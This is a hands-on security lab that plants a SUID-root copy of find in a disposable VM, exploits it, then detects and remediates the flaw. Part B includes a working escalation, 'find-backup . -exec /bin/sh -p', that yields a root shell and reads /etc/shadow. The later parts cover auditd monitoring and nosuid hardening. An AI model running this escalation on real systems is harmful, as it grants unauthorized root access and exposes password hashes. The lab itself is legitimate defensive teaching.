# Lab — SUID Privilege Escalation: Attack, Detect, Remediate

**Environment:** disposable VM or `docker run --rm -it ubuntu:22.04 bash` (root inside).
**Goal:** understand *why* SUID-root binaries are dangerous by exploiting one, then learn
to find and fix it.

> ⚠️ Lab only. See [`../../../labs/SAFETY.md`](../../../labs/SAFETY.md).

---

## Part A — Build the vulnerable condition (as root)
```bash
apt-get update -qq && apt-get install -y findutils auditd sudo passwd >/dev/null 2>&1 || true
useradd -m -s /bin/bash lowpriv 2>/dev/null || true

# The mistake: an admin copies find and leaves it SUID-root "for convenience"
cp "$(command -v find)" /usr/local/bin/find-backup
chmod 4755 /usr/local/bin/find-backup
ls -l /usr/local/bin/find-backup       # -rwsr-xr-x  <- note the 's'
```

## Part B — Attack (as the unprivileged user)
```bash
su - lowpriv
whoami; id                              # lowpriv, uid=1000

# 1. Recon: enumerate SUID binaries (this is the first thing every attacker does)
find / -perm -4000 -type f 2>/dev/null

# 2. Cross-reference with GTFOBins. 'find' can exec commands -> shell.
#    -p makes the shell KEEP the elevated euid instead of dropping it.
/usr/local/bin/find-backup . -exec /bin/sh -p \; -quit

# 3. You now have a root-privileged shell:
id                                      # euid=0(root)
cat /etc/shadow | head -1               # proof: reading a root-only file
exit                                    # leave the root shell
exit                                    # back to root user
```

## Part C — Detect (as root / blue team)
```bash
# Inventory current SUID/SGID and compare against a known-good baseline
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -printf '%m %u %p\n' 2>/dev/null \
  | sort > /tmp/suid.now
# If you had a baseline: diff /tmp/suid.baseline /tmp/suid.now

# If auditd was watching chmod, the planting event is recorded:
auditctl -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid!=-1 -k perm_mod
chmod 4755 /usr/local/bin/find-backup   # re-trigger to demo
ausearch -k perm_mod 2>/dev/null | tail -20
```

## Part D — Remediate & harden
```bash
chmod u-s /usr/local/bin/find-backup    # strip SUID (or: rm -f it)
ls -l /usr/local/bin/find-backup        # -rwxr-xr-x now

# Prevent a whole class of this: mount temp/exec-heavy dirs nosuid (see module 10)
#   /tmp, /var/tmp, /dev/shm -> nosuid,noexec,nodev in /etc/fstab

# Re-baseline
find / -xdev -perm -4000 -type f 2>/dev/null | sort > /tmp/suid.baseline
```

## Deliverables
1. Screenshot/log of `id` showing `euid=0` from the attack.
2. The `ausearch` output proving detection.
3. Your remediation commands and a re-run of the inventory showing it's gone.

## What you learned
- SUID = "run as file owner"; SUID-root + a program that can exec/read/write = root.
- Attackers enumerate SUID first (`find / -perm -4000`); so should defenders.
- Defense: minimize SUID, baseline + monitor with auditd, `nosuid` mounts.
